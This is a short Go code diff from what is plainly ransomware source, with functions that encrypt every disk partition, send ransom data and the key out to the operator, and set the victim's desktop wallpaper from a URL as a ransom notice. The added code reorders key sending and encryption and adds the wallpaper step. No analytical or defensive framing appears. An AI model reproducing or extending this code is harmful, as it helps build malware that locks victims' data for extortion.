@@ -7,6 +7,7 @@ import (
 	"fmt"
 	go_grab_ip "github.com/PaulDotSH/go-grab-ip"
 	"github.com/PaulDotSH/go-idle-info"
+	"github.com/reujab/wallpaper"
 	"github.com/shirou/gopsutil/disk"
 	"io"
 	"io/ioutil"
@@ -246,7 +247,7 @@ func Start() {
 	if e != nil {
 		if !WaitForInternet { //only do this if there is no internet and wait for internet is false
 			Key = StaticKey
-			EncryptEveryPartition([]byte(Key))
+			encryptAndSendKey()
 			return
 		}
 	}
@@ -261,7 +262,21 @@ func Start() {
 	hostname, _ := os.Hostname()
 	CurrentRansomData.ComputerName = hostname
 
-	EncryptEveryPartition([]byte(Key))
+	encryptAndSendKey()
+	if WallpaperUrl != "" {
+		//we don't care about the error since we wont be able to do anything with it anyway
+		fmt.Println(wallpaper.SetFromURL(WallpaperUrl))
+	}
+}
+
+func encryptAndSendKey() {
+	if SendKeyAtStart {
+		SendRansomData()
+		EncryptEveryPartition([]byte(Key))
+	} else {
+		EncryptEveryPartition([]byte(Key))
+		SendRansomData()
+	}
 }
 
 func SendRansomData() {
